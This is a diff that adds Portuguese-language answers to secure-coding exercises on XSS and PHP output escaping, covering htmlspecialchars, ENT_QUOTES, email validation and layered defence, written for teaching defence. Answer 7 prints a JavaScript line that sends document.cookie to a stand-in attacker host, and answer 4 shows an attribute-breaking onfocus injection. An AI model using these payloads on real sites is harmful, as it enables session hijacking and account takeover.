@@ -1,0 +1,70 @@
+**Parte A: Exercícios Teóricos de Fixação**
+
+**1. Conceituação OWASP (XSS)**
+
+* **Significado:** *Cross-Site Scripting* (usado XSS para não confundir com CSS - *Cascading Style Sheets*).
+* **Por que é Client-Side:** O script malicioso é executado diretamente no navegador do usuário final (interpretador JavaScript), permitindo ações como roubo de *session cookies*, redirecionamentos maliciosos e manipulação do DOM.
+* **Por que o Back-End deve prevenir:** O navegador apenas interpreta o HTML/JS retornado pela aplicação. É responsabilidade do Back-End sanitizar as entradas e codificar as saídas (*output encoding*) para garantir que nenhum código injetado pelo usuário seja enviado como código executável para o navegador.
+
+---
+
+**2. Reflected vs. Stored XSS**
+
+* **XSS Refletido (*Reflected*):** A carga maliciosa (*payload*) vem de uma requisição imediata (ex: link malicioso com parâmetros na URL) e é "refletida" na resposta enviada de volta ao usuário. Atinge apenas quem clica no link específico.
+* **XSS Gravado (*Stored*):** O *payload* é persistido permanentemente na base de dados (ex: comentários, fóruns, perfil de usuário) e executado no navegador de **qualquer usuário** que carregar aquela página.
+* **Maior potencial de estrago:** **XSS Gravado**. Ele é passivo (não exige engenharia social para fazer cada vítima clicar em um link específico), atinge múltiplos usuários em massa (incluindo administradores) e permanece ativo até que o registro seja removido do banco.
+
+---
+
+**3. Mecanismo de Escapamento (`htmlspecialchars`)**
+
+* **Transformação dos caracteres:**
+* `<` torna-se `&lt;` (*Less Than*)
+* `>` torna-se `&gt;` (*Greater Than*)
+
+
+* **Por que o navegador não executa:** O analisador sintático (*parser*) do navegador reconhece os símbolos `<` e `>` como delimitadores de tags HTML (ex: `<script>`). Ao receber `&lt;` e `&gt;`, o parser entende que deve tratar o conteúdo estritamente como texto plano a ser desenhado na tela, desativando a interpretação do trecho como elemento executável.
+
+---
+
+**4. Flags de Proteção (`ENT_QUOTES`)**
+
+* **Função da flag `ENT_QUOTES`:** Força a conversão tanto de aspas duplas (`"`) para `&quot;` quanto de aspas simples (`'`) para `&#039;` (ou `&apos;`). Por padrão, a função só converte aspas duplas.
+* **Risco de omissão em `<input value="...">`:** Se o valor for delimitado por aspas simples na sintaxe HTML (ex: `<input value='USER_INPUT'>`) e `ENT_QUOTES` for omitida, um atacante pode injetar uma aspa simples para quebrar o atributo, fechar a tag e injetar um manipulador de eventos JavaScript (ex: `' onfocus='alert(1)`).
+
+---
+
+**5. Anti-Alucinação PHP (`FILTER_SANITIZE_STRING`)**
+
+* `FILTER_SANITIZE_STRING` foi descontinuado (*deprecated*) no PHP 8.1 e **completamente removido no PHP 8.2 e 8.3**.
+* A tentativa de usá-lo no PHP 8.3 resultará em um erro em tempo de execução ou na ineficácia do filtro. Em seu lugar, deve-se utilizar `htmlspecialchars()` para escapamento de saída ou bibliotecas como HTMLPurifier para sanitização de HTML complexo.
+
+---
+
+**6. Validação de E-mail (`empty` vs. `filter_var`)**
+
+* **`empty($email)`:** Apenas verifica se a variável contém um valor nulo, falso, string vazia `""` ou `"0"`. Não analisa se o formato do texto é válido (a string `"abc"` passa como válida).
+* **`filter_var($email, FILTER_VALIDATE_EMAIL)`:** Analisa a estrutura da string segundo a especificação de endereçamento RFC 5322 (presença do `@`, domínio válido, caracteres permitidos antes e depois do `@`).
+
+---
+
+**7. Roubo de Sessão via XSS**
+
+1. O atacante injeta um código JavaScript malicioso através de uma brecha XSS:
+```javascript
+fetch('https://site-do-atacante.com/log?cookie=' + encodeURIComponent(document.cookie));
+
+```
+
+
+2. Quando a vítima acessa a página vulnerável, o navegador executa o script e envia o valor de `document.cookie` (onde fica armazenado o ID de sessão, como `PHPSESSID`) para o servidor do atacante.
+3. De posse do ID de sessão, o atacante clona o cookie em seu próprio navegador e se passa pelo usuário sem precisar de senha.
+*(Mitigação complementar no Back-End: definir a flag `HttpOnly` nos cookies de sessão para impedir o acesso via JavaScript).*
+
+---
+
+**8. Segurança em Camadas (Sanitização na Entrada vs. Codificação na Saída)**
+
+* **Contextos diferentes exigem escapamentos diferentes:** Uma string limpa de tags HTML via `strip_tags` na entrada ainda pode causar estragos se inserida em um contexto de atributo HTML, bloco de script JavaScript ou consulta SQL.
+* **Perda de integridade dos dados:** Se você sanitizar agressivamente na entrada, altera permanentemente os dados originais do usuário (ex: nomes legítimos como "O'Connor" ou símbolos em textos de matemática).
+* **Princípio do menor privilégio:** O escapamento deve ser contextual no momento do rendimento (*Output Encoding*), garantindo que o dado chegue intacto ao banco de dados e só seja neutralizado na camada exata de apresentação.
